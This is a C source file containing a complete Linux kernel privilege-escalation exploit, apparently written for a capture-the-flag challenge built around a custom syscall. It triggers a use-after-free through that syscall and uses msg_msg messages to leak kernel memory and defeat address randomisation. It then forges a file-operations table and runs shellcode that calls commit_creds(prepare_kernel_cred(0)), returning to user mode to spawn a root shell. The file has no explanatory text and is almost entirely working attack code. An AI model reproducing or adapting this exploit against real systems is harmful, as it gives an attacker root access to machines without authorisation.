#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include "libexp.h"

#ifndef __NR_IPS
#define __NR_IPS 548
#endif

long kernel_base = 0;
long target_addr = 0;
long prepare_kernel_cred = 0xffffffff8108aad0;
long commit_creds = 0xffffffff8108a830;
int fds[0x100];

typedef struct {
  int idx;
  unsigned short priority;
  char *data;
} userdata_t;

int alloc(char *data)
{
	userdata_t userdata = {
		.idx = 0,
		.priority = 0,
		.data = data
	};
	assert(strlen(data) < 115);// ???
	int ret = syscall(__NR_IPS, 1, &userdata);
	assert(ret >= 0);
	return ret;
}

int copy(int idx) {
	userdata_t userdata = {
		.idx = idx,
		.priority = 0,
		.data = 0 
	};
	int ret = syscall(__NR_IPS, 4, &userdata);
	// assert(ret >= 0);
	return ret;
}

void delete(int idx) {
	userdata_t userdata = {
		.idx = idx,
		.priority = 0,
		.data = 0 
	};
	int ret = syscall(__NR_IPS, 2, &userdata);
	assert(ret == 0);
}

void edit(int idx, char *data) {
	userdata_t userdata = {
		.idx = idx,
		.priority = 0,
		.data = data
	};
	int ret = syscall(__NR_IPS, 3, &userdata);
	assert(ret == 0);
}

void leak()
{
	int msgqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	assert(msgqid >= 0);

	// prepare heap layout
	defragment(0x80, 0x200);
	int idx = alloc("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
	// spray targets
	for(int i=0; i<sizeof(fds)/sizeof(fds[0]); i++) {
		// fds[i] = open("/dev/null", 0);
		fds[i] = open("/etc/passwd", 0);
	}

	// trigger UAF
	for(int i=0; i<0x10; i++) copy(0);
	puts("before delete...");
	// getchar();
	delete(0);

	char payload[0x50];
	memset(payload, 'A', sizeof(payload));
	msgsnd(msgqid, payload, 0x50, IPC_NOWAIT);

	memset(payload, '\xff', sizeof(payload));
	long *ptr = (long *)&payload[2];
	ptr[0] = 0x4141414141414141;
	ptr[1] = 0x2010;
	edit(-1, payload);

	long leak_buf[0x2010/8];
	memset(leak_buf, 0, sizeof(leak_buf));
	msgrcv(msgqid, leak_buf, sizeof(leak_buf), 0, MSG_NOERROR | IPC_NOWAIT);

	// hex_print(leak_buf, sizeof(leak_buf));

	// leak
	long base = 0;
	for(int i=0; i<sizeof(leak_buf)/8; i++) {
		long leak_ptr = leak_buf[i];
		if((leak_ptr & 0xfffff) == 0x29500) {
			kernel_base = leak_ptr - 0x1029500;
			target_addr = leak_buf[i+6] - 0x58 - 0x10;
			if((target_addr & 0xf00) == 0xf00) break;
		}
	}
}

void attack()
{
	int msgqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	assert(msgqid >= 0);

	// prepare heap layout
	int idx = alloc("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

	// trigger UAF
	for(int i=0; i<0x10; i++) copy(0);
	puts("before delete...");
	delete(0);

	char payload[0x50];
	memset(payload, 'A', sizeof(payload));
	msgsnd(msgqid, payload, 0x50, IPC_NOWAIT);
	// getchar();

	memset(payload, '\x00', sizeof(payload));
	payload[0] = '\xff';
	payload[1] = '\xff';
	long *ptr = (long *)&payload[2];
	ptr[0] = 0x4141414141414141;
	ptr[1] = 0x4242424242424242;
	ptr[2] = target_addr;
	edit(-1, payload);

	long leak_buf[0x2010/8];
	memset(leak_buf, 0, sizeof(leak_buf));
	msgrcv(msgqid, leak_buf, sizeof(leak_buf), 0, MSG_NOERROR | IPC_NOWAIT);

	// hex_print(leak_buf, sizeof(leak_buf));

}

unsigned long long user_ss, user_sp, user_rflags, user_rip, user_cs;

void get_shell()
{
    printf("uid: %d\n", getuid());
    system("/bin/sh");
}

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void shellcode(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        // privilege escalation operations
        "movabs rax, prepare_kernel_cred;" //prepare_kernel_cred
        "xor rdi, rdi;"
        "call rax; mov rdi, rax;"
        "movabs rax, commit_creds;" //commit_creds
        "call rax;"

        // return back to user safely
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}


int main()
{
	printf("shellcode: %p\n", shellcode);
	user_rip = get_shell;
	save_state();
	leak();
	long kaslr_slide = kernel_base-0xffffffff81000000;
	printf("kernel_base: %#lx\n", kernel_base);
	printf("kaslr slide: %#lx\n", kaslr_slide);
	prepare_kernel_cred += kaslr_slide;
	commit_creds += kaslr_slide;
	assert(kernel_base != 0);
	printf("target_addr: %#lx\n", target_addr);

	attack();

	long payload[0x50/8];
	memset(payload, 'B', sizeof(payload));
	long *fake_op = umem_alloc(0x700000, 0x1000);
	printf("fake_op: %p\n", fake_op);
	payload[2] = (long)fake_op;
	// memset(fake_op, 'A', 0x80);
	fake_op[0x78/8] = shellcode;
	msg_spray(payload, 0x50, 0x100);
	// for(int i=0; i<100; i++) open("/dev/null", 0);
	// getchar();

	// for(int i=0; i<sizeof(fds)/sizeof(fds[0]); i++) lseek(fds[i], 0, SEEK_SET);
	for(int i=0; i<sizeof(fds)/sizeof(fds[0]); i++) close(fds[i]);

	puts("after trigger");
	getchar();
}
